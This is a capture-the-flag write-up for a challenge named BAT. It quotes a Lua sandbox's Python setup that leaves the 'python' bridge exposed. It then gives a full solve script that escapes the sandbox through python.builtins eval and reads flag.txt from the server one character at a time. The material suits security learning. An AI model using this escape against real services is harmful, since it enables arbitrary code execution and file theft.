# BAT

## Description

```
Take a look at my new Binary Analysis Tool (BAT)! I even added a preprocessor to make it cooler!
```

## Categories

- `misc`

## Provided Files

- `BAT.zip`

## Solve Process

After taking a look at the codebase of this challenge, I very quickly noticed that the Lua environment was being sanitized.

```py
# --- snip --- #
safe_env = {
    'error': lua.globals().error,
    'ipairs': lua.globals().ipairs,
    'next': lua.globals().next,
    'pairs': lua.globals().pairs,
    'select': lua.globals().select,
    'tonumber': lua.globals().tonumber,
    'tostring': lua.globals().tostring,
    'type': lua.globals().type,
    'python': lua.globals().python,
    'unpack': lua.globals().unpack,
    'string': lua.globals().string,
    'table': lua.globals().table,
    'math': lua.globals().math,
}

# Clear all globals except _G
for key in list(lua.globals()):
    if key != '_G':
        del lua.globals()[key]

# Assign the safe environment back to Lua globals
for key, value in safe_env.items():
    lua.globals()[key] = value
# --- snip --- #
def _filter_attribute_access(obj, attr_name, is_setting):
    if isinstance(attr_name, str):
        if not attr_name.startswith('_'):
            return attr_name
    raise AttributeError('access denied')
# --- snip --- #
```

The important thing to note is that `lua.globals().python` is specified in the `safe_env`, which points to the possibility of using python tools in the preprocessor code.

After some tinkering around on how to load the python functions onto a var, I came up with a pretty ugly way of retrieving the flag one by one, absuing the preprocessor to only output a single char byte value everytime.

```py
import requests
import time

BASE_URL = "https://geriyif4okt43u71.dyn.acsc.land/"
full_flag = ''
files = { 'file': ('stubby', b'\x7fELF', 'application/octet-stream') }

for i in range(0,100):
    lua_code = f'''function(binary_data)
        local py_builtins = python.builtins
        local eval_func = py_builtins["eval"]
        local code = [[str(hex(ord(list(list(open('./flag.txt'))[0])[{i}])).split('x')[1])]]
        local result = eval_func(code)
        return result
    end
    '''
    data = {
        'lua_code': lua_code
    }
    response = requests.post(BASE_URL, files=files, data=data, timeout=10)

    if response.status_code != 200:
        print(f"ERROR at Index: {i}: {response.status_code} with {response.text}")
        break

    for i, j in enumerate(response.text.split("\n")):
        if "readonly>{" in j:
            char = chr(int(response.text.split("\n")[i + 1].split(";")[1].split("&")[0]))
            full_flag += char
            print(f"Progress: {full_flag}")
            if char == "}":
                break

    # dont DoS the instance lmao
    time.sleep(2)

print(f"FLAG: {full_flag}")
```

This takes a while, also because I added the `time.sleep(2)` so the infra doesn't get mad at me I guess, but eventually it retrieves the full flag.
